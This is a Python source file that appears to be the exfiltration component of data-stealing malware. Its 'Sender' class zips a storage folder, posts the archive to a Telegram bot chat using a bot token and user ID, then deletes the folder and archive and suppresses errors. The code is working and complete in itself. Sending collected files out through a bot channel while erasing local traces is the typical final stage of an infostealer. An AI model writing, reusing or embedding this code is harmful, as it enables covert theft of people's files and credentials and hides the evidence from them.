from os import remove
from requests import post
from shutil import make_archive, rmtree


class Sender:

    def __init__(self, *args):

        self.zip_name = args[0]
        self.storage_path = args[1]
        self.storage_folder = args[2]
        self.errors = args[5]

        self.token = args[3]
        self.user_id = args[4]

    def __create_archive(self):

        make_archive(f"{self.storage_path}{self.zip_name}", "zip", f"{self.storage_path}{self.storage_folder}")

    def __send_archive(self):

        with open(f"{self.storage_path}{self.zip_name}.zip", "rb") as file:

            post(
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data={
                    "chat_id": self.user_id
                },
                files={
                    "document": file
                }
            )

        file.close()

    def __delete_files(self):

        rmtree(f"{self.storage_path}{self.storage_folder}")
        remove(f"{self.storage_path}{self.zip_name}.zip")

    def run(self):

        try:

            self.__create_archive()
            self.__send_archive()
            self.__delete_files()

        except Exception as e:

            if self.errors is True:
                print(f"[SENDER]: {repr(e)}")
